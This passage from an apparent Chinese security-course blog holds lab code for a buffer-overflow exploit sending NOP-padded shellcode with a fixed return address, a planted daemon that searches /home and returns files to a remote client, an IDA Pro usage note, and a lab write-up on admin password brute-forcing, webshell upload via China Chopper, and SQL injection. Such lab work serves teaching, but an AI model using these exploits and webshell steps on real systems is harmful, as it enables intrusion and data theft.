class="line">                <span class="comment"># shutdown(2) #收发通道关闭</span></span><br><span class="line">                clientsocket.close() <span class="comment">#关闭socket</span></span><br><span class="line">                attack_a3 = input(<span class="string">"此轮socket已关闭，是否继续攻击/通信（需要等目标恢复服务）？(y/n):"</span>)</span><br><span class="line">                <span class="keyword">if</span> attack_a3 == <span class="string">"y"</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    print(<span class="string">"END"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tans</span><span class="params">(clientsocket)</span>:</span></span><br><span class="line">    print(<span class="string">"connect success"</span>)</span><br><span class="line">    print(<span class="string">"attack_mode：【1】创建txt文件 【2】发送daemon程序 【3】执行daemon文件 【其他】正常沟通（输入quit退出））"</span>)</span><br><span class="line">    attack_mode = input(<span class="string">"请输入attack_mode:"</span>)</span><br><span class="line">    <span class="keyword">if</span> attack_mode == <span class="string">"1"</span>:  <span class="comment"># 【1】创建txt文件</span></span><br><span class="line">        print(<span class="string">"创建txt文件shellcode发送"</span>)</span><br><span class="line">        <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"1"</span>))  <span class="comment"># 这里要发生字节流形式，记住这个形式就可以了</span></span><br><span class="line">        print(<span class="string">"创建txt文件shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">elif</span> attack_mode == <span class="string">"2"</span>:  <span class="comment"># 【2】发送daemon程序</span></span><br><span class="line">        print(<span class="string">"发送daemon程序shellcode发送"</span>)</span><br><span class="line">        payload_new(shellcode_daemon) <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"2"</span>))  <span class="comment"># 这里要发生字节流形式，记住这个形式就可以了</span></span><br><span class="line">        data = clientsocket.recv(<span class="number">1024</span>)</span><br><span class="line">        print(<span class="string">"发送daemon程序shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">elif</span> attack_mode == <span class="string">"3"</span>:  <span class="comment"># 【3】执行daemon文件</span></span><br><span class="line">        print(<span class="string">"执行daemon文件shellcode发送"</span>)</span><br><span class="line">        payload_new(shellcode_execdaemon) <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"3"</span>))  <span class="comment"># 这里要发生字节流形式，记住这个形式就可以了</span></span><br><span class="line">        print(<span class="string">"执行daemon文件shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 【其他】正常沟通</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            input_data = input(<span class="string">"send:"</span>)</span><br><span class="line">            <span class="keyword">if</span> input_data==<span class="string">"quit"</span>:</span><br><span class="line">                input_data = <span class="string">b"\x90"</span> * (<span class="number">120</span>)</span><br><span class="line">                clientsocket.send(input_data)   <span class="comment"># 使服务器异常退出停止socket，可用于中止服务器</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            clientsocket.send(input_data.encode(<span class="string">"utf-8"</span>))  <span class="comment"># 这里要发生字节流形式，记住这个形式就可以了</span></span><br><span class="line">            data = clientsocket.recv(<span class="number">1024</span>)</span><br><span class="line">            print(<span class="string">"recv:"</span>, data)</span><br><span class="line"><span class="comment">#用于拼接字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_new</span><span class="params">(shellcode_mode)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> shellcode_mode==<span class="string">"2"</span>:</span><br><span class="line">        payload = shellcode_daemon + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_daemon))</span><br><span class="line">    <span class="keyword">elif</span> shellcode_mode==<span class="string">"3"</span>:</span><br><span class="line">        payload = shellcode_execdaemon + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_execdaemon))</span><br><span class="line">        print(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = shellcode_createtxt + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_createtxt))</span><br><span class="line">    payload = payload + <span class="string">b'\xcc\xde\xff\xbf\xdc\xde\xff\xbf'</span></span><br><span class="line">    payload = payload + <span class="string">b'\x00'</span></span><br><span class="line">    print(<span class="string">"拼接payload成功"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">print(<span class="string">"正在扫描..., 请稍等..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 启动扫描程序</span></span><br><span class="line">    <span class="comment"># ports=input("输入想要扫描的端口")</span></span><br><span class="line">    <span class="comment"># port_list = port_list.append(ports.split(' '))</span></span><br><span class="line">    <span class="comment"># print(port_list)</span></span><br><span class="line">    <span class="comment"># search_routers()</span></span><br><span class="line">    comm_or_attack()</span><br></pre></td></tr></table></figure>

<h2 id="6-3-daemon服务端（受害方）程序-daemonl-py"><a href="#6-3-daemon服务端（受害方）程序-daemonl-py" class="headerlink" title="6.3 daemon服务端（受害方）程序 daemonl.py"></a>6.3 daemon服务端（受害方）程序 daemonl.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment">#公钥和公钥摘要不一致，密钥被篡改！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthenticationError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, Errorinfo)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.errorinfo = Errorinfo</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.errorinfo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 默认的最大等待数量为5</span></span><br><span class="line">    <span class="comment"># 默认使用本机的ip地址和8080端口</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, backlog=<span class="number">5</span>, addr=<span class="params">(<span class="string">"192.168.30.133"</span>, <span class="number">8080</span>)</span>)</span>:</span></span><br><span class="line">        <span class="comment"># 默认使用AF_INET协议族，即ipv4地址和端口号的组合以及tcp协议</span></span><br><span class="line">        self.serverSocket = socket.socket()</span><br><span class="line">        <span class="comment"># 绑定监听的ip地址和端口号</span></span><br><span class="line">        self.serverSocket.bind(addr)</span><br><span class="line">        <span class="comment"># 开始等待</span></span><br><span class="line">        self.serverSocket.listen(backlog)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 该函数需要并行处理</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">link_one_client</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 获取客户端对象和客户端地址</span></span><br><span class="line">        clientSocket, addr = self.serverSocket.accept()</span><br><span class="line">        <span class="comment"># 打印</span></span><br><span class="line">        print(<span class="string">"和客户端建立连接\n目标主机地址为：&#123;0&#125;"</span>.format(addr))</span><br><span class="line">        <span class="comment"># 接受客户端传递的公钥</span></span><br><span class="line">        <span class="comment"># 这里可以加一个哈希函数检验公钥的正确性！</span></span><br><span class="line">        <span class="comment"># 运用pickle进行反序列化</span></span><br><span class="line">        publicKeyPK, pubKeySha256 = pickle.loads(clientSocket.recv(<span class="number">1024</span>))</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(publicKeyPK).hexdigest() != pubKeySha256:</span><br><span class="line">            <span class="keyword">raise</span> AuthenticationError(<span class="string">"公钥被篡改！"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            publicKey = pickle.loads(publicKeyPK)</span><br><span class="line">            print(<span class="string">"已接受公钥"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 下面是用公钥加密对称密钥并传递的过程</span></span><br><span class="line">        <span class="comment"># 产生用于 AES 对称加密的密钥</span></span><br><span class="line">        sym_key = Fernet.generate_key()</span><br><span class="line">        <span class="comment"># 用pickle进行序列化用来进行网络传输</span></span><br><span class="line">        <span class="comment"># 对密钥进行hash保证其准确性</span></span><br><span class="line">        en_sym_key = rsa.encrypt(pickle.dumps(sym_key), publicKey)</span><br><span class="line">        en_sym_key_sha256 = hashlib.sha256(en_sym_key).hexdigest()</span><br><span class="line">        print(<span class="string">"正在加密传送AES对称密钥"</span>) <span class="comment">#发送AES密钥以及AES密钥的摘要</span></span><br><span class="line">        clientSocket.send(pickle.dumps((en_sym_key,en_sym_key_sha256)))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 这里可以添加密钥交换成功的函数</span></span><br><span class="line">        print(<span class="string">"密钥交换结束"</span>)</span><br><span class="line">        <span class="comment"># 从AES的密钥初始化加密对象</span></span><br><span class="line">        AES = Fernet(sym_key)</span><br><span class="line">        <span class="comment"># 下面使用对称密钥进行加密对话的过程</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="comment"># 接收到的加密消息</span></span><br><span class="line">            recvData = clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># ============接收解密=================</span></span><br><span class="line">            <span class="comment"># recvData = AES.decrypt(recvData).decode()  #====接收解密</span></span><br><span class="line">            <span class="comment"># ================不解密=================</span></span><br><span class="line">            recvData = recvData.decode()</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"接受到客户端传来的消息：&#123;0&#125;"</span>.format(recvData))</span><br><span class="line">            sendData = get_reply(recvData)<span class="comment">#调用回复函数来判断</span></span><br><span class="line">            <span class="comment"># 对消息进行加密</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># ============加密发送=================</span></span><br><span class="line">            <span class="comment"># sendData = AES.encrypt(sendData.encode())</span></span><br><span class="line">            <span class="comment"># clientSocket.send(sendData)</span></span><br><span class="line">            <span class="comment"># ===============不加密=================</span></span><br><span class="line">            clientSocket.send(sendData.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># route=["/home/lfl/桌面/Socket_Example-master/lesson03_trans_file/lfl.txt"] #路径列表，我们用第一个</span></span><br><span class="line">routes=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_reply</span><span class="params">(recvData)</span>:</span></span><br><span class="line">    recvData=json.loads(recvData)</span><br><span class="line">    <span class="comment"># print(recvData["A"])</span></span><br><span class="line">    <span class="keyword">if</span> recvData[<span class="string">"Method"</span>]==<span class="string">"get_file"</span>:</span><br><span class="line">        print(recvData[<span class="string">"file_name"</span>])</span><br><span class="line">        search(os.path.abspath(<span class="string">'/home'</span>), recvData[<span class="string">"file_name"</span>])</span><br><span class="line">        <span class="comment"># print(route[0])</span></span><br><span class="line">        print(routes)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;\"content\":\""</span>+open(routes[<span class="number">0</span>]).read().replace(<span class="string">'\n'</span>, <span class="string">''</span>).replace(<span class="string">'\r'</span>, <span class="string">''</span>)+<span class="string">"\"&#125;"</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment">#不是get_file</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;\"content\":\"hello\"&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#搜索文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(curpath, s)</span>:</span></span><br><span class="line">    L = os.listdir(curpath)  <span class="comment">#列出当前目录下所有文件</span></span><br><span class="line">    <span class="keyword">for</span> subpath <span class="keyword">in</span> L:  <span class="comment">#遍历当前目录所有文件</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(os.path.join(curpath, subpath)):  <span class="comment">#若文件仍为目录，递归查找子目录</span></span><br><span class="line">            newpath = os.path.join(curpath, subpath)</span><br><span class="line">            search(newpath, s)</span><br><span class="line">        <span class="keyword">elif</span> os.path.isfile(os.path.join(curpath, subpath)):  <span class="comment">#若为文件，判断是否包含搜索字串</span></span><br><span class="line">            <span class="keyword">if</span> s <span class="keyword">in</span> subpath:</span><br><span class="line">                routes.append(os.path.join(curpath, subpath))</span><br><span class="line">                <span class="comment">#print(routes)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#main函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"dameon开始运行！"</span>)</span><br><span class="line">    server = Server()</span><br><span class="line">    server.link_one_client()</span><br></pre></td></tr></table></figure>

<h2 id="6-4-daemon客户端（攻击方）程序-client-py"><a href="#6-4-daemon客户端（攻击方）程序-client-py" class="headerlink" title="6.4 daemon客户端（攻击方）程序 client.py"></a>6.4 daemon客户端（攻击方）程序 client.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment">#公钥和公钥摘要不一致，密钥被篡改！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthenticationError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, Errorinfo)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.errorinfo = Errorinfo</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.errorinfo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 产生rsa非对称密钥</span></span><br><span class="line">        self.rsaKey = rsa.newkeys(<span class="number">2048</span>)</span><br><span class="line">        <span class="comment"># 产生rsa公钥和私钥</span></span><br><span class="line">        self.publicKey = self.rsaKey[<span class="number">0</span>]</span><br><span class="line">        self.privateKey = self.rsaKey[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">link_server</span><span class="params">(self, ip,port )</span>:</span></span><br><span class="line">        addr = (ip, port)</span><br><span class="line">        <span class="comment"># 创建socket通信对象</span></span><br><span class="line">        <span class="comment"># 默认使用AF_INET协议族，即ipv4地址和端口号的组合以及tcp协议</span></span><br><span class="line">        clientSocket = socket.socket()</span><br><span class="line">        <span class="comment"># 默认连接服务器地址为本机ip和8080端口</span></span><br><span class="line">        clientSocket.connect(addr)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 向服务器传递公钥，和该公钥字符串化后的sha256值</span></span><br><span class="line">        <span class="comment"># 发送的sha256用于校验公钥是否正确</span></span><br><span class="line">        print(<span class="string">"正在向服务器传送 RSA 公钥"</span>)</span><br><span class="line">        sendKey = pickle.dumps(self.publicKey)</span><br><span class="line">        sendKeySha256 = hashlib.sha256(sendKey).hexdigest()</span><br><span class="line">        clientSocket.send(pickle.dumps((sendKey, sendKeySha256)))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接受服务器传递的密钥并进行解密</span></span><br><span class="line">        symKey, symKeySha256 = pickle.loads(clientSocket.recv(<span class="number">1024</span>))</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(symKey).hexdigest() != symKeySha256:</span><br><span class="line">            <span class="keyword">raise</span> AuthenticationError(<span class="string">"AES密钥被篡改！"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.symKey = pickle.loads(rsa.decrypt(symKey, self.privateKey))</span><br><span class="line">            print(<span class="string">"AES密钥交换完成"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从AES的密钥初始化加密对象</span></span><br><span class="line">        AES = Fernet(self.symKey)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            file_name = input(<span class="string">"输入你想获得的文件："</span>)</span><br><span class="line">            sendData =<span class="string">"&#123;\"Method\":\"get_file\",\"file_name\": \""</span>+file_name+<span class="string">"\"&#125;"</span></span><br><span class="line">            print(sendData)</span><br><span class="line">            <span class="comment"># ============加密发送=================</span></span><br><span class="line">            <span class="comment"># sendData = AES.encrypt(sendData.encode())</span></span><br><span class="line">            <span class="comment"># clientSocket.send(sendData)</span></span><br><span class="line">            <span class="comment"># ===============不加密=================</span></span><br><span class="line">            clientSocket.send(sendData.encode())</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 接收数据</span></span><br><span class="line">            recvData = clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment"># ============接收解密=================</span></span><br><span class="line">            <span class="comment"># recvData = AES.decrypt(recvData).decode()</span></span><br><span class="line">            <span class="comment"># ================不解密=================</span></span><br><span class="line">            recvData = recvData.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            print(<span class="string">"接收到加密的文件数据,保存文件"</span>)</span><br><span class="line">            print(recvData)</span><br><span class="line">            recvData = json.loads(recvData) <span class="comment">#加载文件内容为json</span></span><br><span class="line">            file = open(file_name, <span class="string">'a'</span>)  <span class="comment"># 若文件不存在，系统自动创建'a'表示可连续写入到文件，保留原内容，在原内容之后写入，可修改该模式（'w+','w','wb'等）</span></span><br><span class="line">            file.write(recvData[<span class="string">"content"</span>])  <span class="comment"># 将字符串写入文件中</span></span><br><span class="line">            file.close()</span><br><span class="line">            print(<span class="string">"接受到服务器传来的消息：&#123;0&#125;"</span>.format(recvData))</span><br><span class="line"><span class="comment">#main函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"欢迎使用客户端程序！"</span>)</span><br><span class="line">    client = Client()</span><br><span class="line">    client.link_server(<span class="string">"192.168.30.133"</span>,<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA pro的使用总结</title>
    <url>/2020/06/13/2020-06-13-ida-usage/</url>
    <content><![CDATA[<p>目前知道的快捷键：</p>
<ul>
<li>双击某个函数进入其中</li>
<li>双击进入某个函数后，按ESC返回上一级函数</li>
<li>在返回上一级函数后，按CTRL+ENTER进入之前的下一级函数</li>
<li>在汇编界面按 <code>;</code>进行注释，在C语言界面按<code>/</code>进行注释</li>
<li>在注释完之后按CTRL+ENTER确定注释，手点确定确实累</li>
<li>在graph视图模式按F5从汇编切换到C语言</li>
<li>在graph视图模式，当光标在某个函数框里时，按空格键切换汇编和graph视图</li>
<li>右键左边function视图可以看到Edit function 可以修改颜色，标记自己发现的比较重要的函数。（也可以在graph的代码界面右键进行颜色标记）</li>
</ul>
<p>几个重要的视图：</p>
<ul>
<li>被引用、和引用的网络图，这个在主视图-graph视图-右键菜单的倒数几项里</li>
<li>然后就是Proximity browser视图，这个很好用，直接把每个功能模块抽象成一个函数名（有的函数名仍是stu_xxxx），而且点击某个函数可以进入，点击当前的顶层函数名，还可以找到调用他的链接。</li>
<li>然后是左边的function视图，可以ctrl+F搜索某个函数，有些都是stu、有些是引入的，这个也很重要，用来进入键盘、文件函数的内部，然后在Proximity browser视图逐级往上找调用它的函数。</li>
</ul>
<p>现在知道的逆向思路（学习参考qhy做法）</p>
<ul>
<li><p>对于键盘来说</p>
<ul>
<li><p>在Import导入函数视图中，按CTRL+F，搜索框搜索<code>key</code>这个关键字。可以看到相关的引入函数</p>
</li>
<li><p>现在已知的关键函数有：</p>
<ul>
<li><p><code>SHORT GetAsyncKeyState(int vKey);</code><strong>直接侦测键盘的硬件中断</strong>，返回key status. 然后判断返回值的最高位是不是1，如果是表示这个处于按下状态</p>
</li>
<li><p><code>SHORT GetKeyState(  int nVirtKey );</code> 从windows消息队列中取得键盘消息，返回key status.</p>
<p>nVrtKey：定义一虚拟键。若要求的虚拟键是字母或数字（A～Z，a～z或0～9），nVirtKey必须被置为相应字符的ASCII码值，对于其他的键，nVirtKey必须是一虚拟键码。</p>
<p>GetKeyState函数是用来<strong>获取指定的虚拟键码的按键的状态</strong>。返回码的高位显示当前是否有键被按下，低位（0位）则显示NumLock、CapsLock、ScrollLock的状态（ON或OFF，为ON时键盘指示灯亮）。即高位为1，返回值小于0，说明有键按下</p>
</li>
</ul>
</li>
<li><p>然后<strong>在function视图中搜索GetKeyState这个函数</strong>，可以看到一些函数块，点击进去，在主页面可以看到点击出来的函数块，<strong>开启Proximity browser视图</strong>，然后就可以级往上找调用它的函数。</p>
</li>
<li><p>然后看到可能是比较重要的，可以切换到graph的汇编视图来，或者F5的C语言视图来查看代码进行分析。</p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>网安平台实验5-综合实验</title>
    <url>/2020/05/25/2020-05-25-Network-Security-Experiment-5/</url>
    <content><![CDATA[<h1 id="企业环境渗透一"><a href="#企业环境渗透一" class="headerlink" title="企业环境渗透一"></a>企业环境渗透一</h1><h2 id="任务一、后台文件上传"><a href="#任务一、后台文件上传" class="headerlink" title="任务一、后台文件上传"></a>任务一、后台文件上传</h2><h3 id="【任务描述】"><a href="#【任务描述】" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>使用wwwscan扫描网站后台目录，利用Burpsuite工具爆破网站后台用户名密码，获取cms的管理员密码登录后台。
构造php一句话木马，利用后台任意文件上传漏洞将木马上传到目标服务器，然后再使用中国菜刀连接一句话木马，获取目标服务器的webshell以便进行后续的操作。</code></pre><p>通过完成本实验任务，要求学生掌握利用Burpsuite进行后台密码爆破技术并获取目标服务器cms的后台管理员密码。掌握通过一句话木马和中国菜刀配合实现对文件上传漏洞利用的的流程、方法和技巧，为完成后续企业渗透实验任务奠定坚实的漏洞利用技术基础。</p>
<h3 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
熟悉网站webshell的概念，理解上传webshell、获取webshell权限的意义和方法。
掌握webshell工具中国菜刀的基本使用，查看上传文件，命令执行等功能的使用。
掌握在浏览器上配置代理的方法。
掌握利用Burpsuite进行抓包拦截和使用Intruder模块进行web后台用户名和密码的爆破技术。</code></pre><h3 id="实验工具"><a href="#实验工具" class="headerlink" title="实验工具"></a>实验工具</h3><ul>
<li>Brupsuite</li>
<li>中国菜刀</li>
<li>Firefox</li>
<li>wwwscan</li>
</ul>
<h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><p>1.1 使用目录扫描工具对目标网站的后台地址进行扫描(如wwwscan)</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530145920042.png" alt="image-20200530145920042"></p>
<p>启动扫描，得到后台登陆地址为 <code>manager/login.php</code></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530150313985.png" alt="image-20200530150313985"></p>
<p>1.2 使用Burpsuite工具爆破后台管理员密码</p>
<p>用户名一般为admin，所以使用burpsuite的单变量爆破。</p>
<p>firefox配置代理127.0.0.1</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530193004243.png" alt="image-20200530193004243"></p>
<p>手动代理</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530192953349.png" alt="image-20200530192953349"></p>
<p>Burpsuite抓包，右键send to intruder</p>
<p>然后clear所有变量，add密码单变量，点击paylaods进行设置</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530192859784.png" alt="image-20200530192859784"></p>
<p>开始攻击</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530193347086.png" alt="image-20200530193347086"></p>
<p>选择Length比较特殊的payload（密码），这里是<code>1q2w3e4r</code>，登陆网站进行测试成功，得到后台密码。</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530193753461.png" alt="image-20200530193753461"></p>
<p>1.3 使用爆破出的管理员密码登录后台，并上传一句话木马</p>
<p>登陆</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530151252176.png" alt="image-20200530151252176"></p>
<p>修改附件类型设置允许php</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530153846176.png" alt="image-20200530153846176"></p>
<p>编写一句话木马</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530153553270.png" alt="image-20200530153553270"></p>
<p>根目录上传一句话木马</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530153714234.png" alt="image-20200530153714234"></p>
<p>选择上传</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530154004906.png" alt="image-20200530154004906"></p>
<p>上传成功</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530154012765.png" alt="image-20200530154012765"></p>
<p>1.4 使用中国菜刀连接一句话木马</p>
<p>新建项，将一句话木马的url填写，在连接后面text框写一句话木马的参数，在配置里选好语言类型，点击添加。</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530171453121.png" alt="image-20200530171453121"></p>
<p>连接成功</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530154219223.png" alt="image-20200530154219223"></p>
<h3 id="实验结果提交"><a href="#实验结果提交" class="headerlink" title="实验结果提交"></a>实验结果提交</h3><blockquote>
<p>提交目标网站后台首页中的flag{32位MD5} 字样的字符串作为实验结果提交，提交后该实验任务完成。</p>
</blockquote>
<p><code>flag1{5d41402abc4b2a76b9719d911017c592}</code></p>
<p>解密结果：hello</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530152155634.png" alt="image-20200530152155634"></p>
<h2 id="任务二、Sql注入"><a href="#任务二、Sql注入" class="headerlink" title="任务二、Sql注入"></a>任务二、Sql注入</h2><h3 id="【任务描述】-1"><a href="#【任务描述】-1" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>利用之前扫描目录得到的结果访问到测试的sql页面，利用SQL注入漏洞获得网站数据库信息
构造SQL注入语句读取webserver配置文件查看网站根目录，写入php一句话木马，获得webshell。</code></pre><p>通过完成本实验任务，要求学生掌握利用SQL注入漏洞进行信息获取并向目标服务器上写入一句话木马。掌握通过一句话木马和中国菜刀配合实现对SQL注入写文件漏洞利用技术的流程、方法和技巧，为完成后续企业渗透实验任务奠定坚实的漏洞利用技术基础。</p>
<h3 id="实验目标-1"><a href="#实验目标-1" class="headerlink" title="实验目标"></a>实验目标</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
熟悉网站webshell的概念，理解上传webshell、获取webshell权限的意义和方法。
掌握webshell工具中国菜刀的基本使用，查看上传文件，命令执行等功能的使用。
掌握SQL注入漏洞的原理，能够手工注入出数据库中的数据。
掌握利用SQL注入漏洞读取webserver文件并写入webshell的方法。</code></pre><h3 id="实验工具-1"><a href="#实验工具-1" class="headerlink" title="实验工具"></a>实验工具</h3><p><a href="https://blog.csdn.net/weixin_40412037/article/details/103727238" target="_blank" rel="noopener">sql注入参考连接</a></p>
<h3 id="操作步骤-1"><a href="#操作步骤-1" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code>访问sql目录，利用SQL注入漏洞获取网站数据库基本信息，如当前使用的数据库用户等。
利用SQL注入漏洞读取apache的配置文件，并通过配置文件中获取的网站根目录将一句话木马写入到网站目录中。
使用中国菜刀连接目标服务器上的一句话木马，查找网站根目录下文件中包含的flag值并提交</code></pre><p>1.访问sql目录<code>192.168.19/sql/</code>，利用SQL注入漏洞获取网站数据库基本信息，如当前使用的数据库用户等。</p>
<p>第一步：打开目标网站</p>
<p>可以知道当前的查询语句是Select *FROM dede_admin where id=1    </p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530152442269.png" alt="image-20200530152442269"></p>
<p>通过测试，可以知道通过查询id=XX可以查询到结果</p>
